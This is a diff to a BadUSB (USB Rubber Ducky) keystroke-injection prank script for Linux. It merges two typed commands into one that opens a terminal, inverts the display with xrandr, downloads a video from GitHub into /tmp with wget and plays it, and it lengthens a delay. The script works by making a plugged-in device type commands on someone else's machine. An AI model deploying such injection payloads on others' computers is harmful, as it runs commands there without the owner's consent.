@@ -12,12 +12,8 @@ WINDOWS d
 DELAY 300
 CTRL-ALT t
 DELAY 2000
-STRING xrandr -o inverted
+STRING xrandr -o inverted && nohup wget -P /tmp/ https://github.com/FalsePhilosopher/BadUSB-Playground/raw/main/Ducky/USBRubberducky/library/prank/Unix-like/Linux/Inverted_desktop_troll/milos/milos.mp4 >/dev/null &&  xdg-open /tmp/milos.mp4 &
 DELAY 300
 ENTER
-DELAY 300
-STRING nohup wget -P /tmp/ https://github.com/FalsePhilosopher/BadUSB-Playground/raw/main/Ducky/USBRubberducky/library/prank/Unix-like/Linux/Inverted_desktop_troll/milos/milos.mp4 >/dev/null &&  xdg-open /tmp/milos.mp4 &
-DELAY 300
-ENTER
-DELAY 5000
+DELAY 10000
 STRING f
